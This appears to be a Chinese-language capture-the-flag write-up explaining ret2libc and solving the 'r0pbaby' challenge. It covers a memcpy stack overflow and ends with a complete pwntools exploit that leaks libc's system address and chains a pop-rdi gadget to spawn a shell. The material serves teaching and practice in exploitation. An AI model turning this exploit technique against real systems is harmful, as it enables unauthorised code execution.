re2libc

ret2libc 就是控制程序执行 libc 库中的函数，通常是返回到某个函数的 PLT 处或函数的具体位置（即函数 GOT 表项的内容） 有以下三种情况

  • 程序中既有 system 又有 /bin/sh，或者说在给出的可执行文件中能找到 system 函数的地址和 /bin/sh 字符串的地址 这种情况直接构造参数调用函数即可
  • 程序中只有 system，或者说在给出的可执行文件中能找到 system 函数的地址，但找不到 /bin/sh 字符串的地址。 这种情况需要泄露某个可写输入位置的地址，先用输入函数输入 /bin/sh，再构造参数，最后调用 system
  • 程序中既没有 system 也没有 /bin/sh，或者说在给出的可执行文件中既找不到 system 函数的地址，也找不到 /bin/sh 字符串的地址。 这种情况需要先泄露 libc 中某个函数的地址，再通过偏移得到 libc 基址，然后计算出 libc 中 system 函数的地址和 /bin/sh 字符串的地址，最后调用

用 IDA 反汇编

  1. dlopen 以特定方式将指定的动态库加载到当前进程中，并返回一个可用的句柄，用于后续获取函数地址等操作；
  1. dlsym 从指定的库（由 dlopen 的返回值指定）中获取指定的函数（第二个参数为函数名）；
  1. dlclose 可以关闭并卸载动态库；注意它实际上是将动态库的引用计数（ref）减一，只有计数减到 0 时才会触发卸载操作；
  1. dlerror 返回描述错误的字符串；

通常的三步走模式是：先打开（dlopen），再获取需要的函数（dlsym），然后调用函数，最后关闭（dlclose）

C 库函数 void (*signal(int sig, void (*func)(int)))(int) 设置一个处理信号的函数，即带有 sig 参数的信号处理程序。当发生信号处理时，会调用 func 对应的函数

这个函数有三个功能

  1. 获取 libc 加载的基址
  2. 获取 libc 中某个函数的地址
  3. 向栈上输入内容

C 库函数 void *memcpy(void *str1, const void *str2, size_t n) 从存储区 str2 复制 n 个字节到存储区 str1。

注意 nptr 是输入内容的起始地址，而 &savedregs 顾名思义——在 IDA 中也可以验证——是栈上保存 rbp 的位置，v7 是输入的长度。这里存在溢出：memcpy 之后，复制的值可能覆盖到返回地址

from pwn import *
context(os="linux",arch="amd64",log_level="debug")
r=process("./r0pbaby")
#gdb.attach(r,"b*main")
def get_sys_addr():
    r.recvuntil(b"4) Exit")
    r.recvuntil(b": ")
    r.sendline(b"2")
    r.sendlineafter(b"Enter symbol: ",b"system")
    r.recvuntil(b"Symbol system: ")
    system_addr=r.recvuntil(b"\n")[:-1]
    return system_addr

def send_payload(payload):
    r.recvuntil(b"4) Exit")
    r.recvuntil(b": ")
    r.sendline(b"3")
    r.sendlineafter(b"Enter bytes to send (max 1024): ",str(len(payload)))

    r.sendline(payload)
    

system_addr=int(get_sys_addr(),16)
ret_addr=system_addr-162871
print("system_addr",hex(system_addr))
binsh_addr=system_addr+1603848
pop_rdi_addr=system_addr-158091
payload=b"a"*8+p64(pop_rdi_addr)+p64(binsh_addr)+p64(ret_addr)+p64(system_addr)
print(len(payload))
send_payload(payload)
r.interactive()
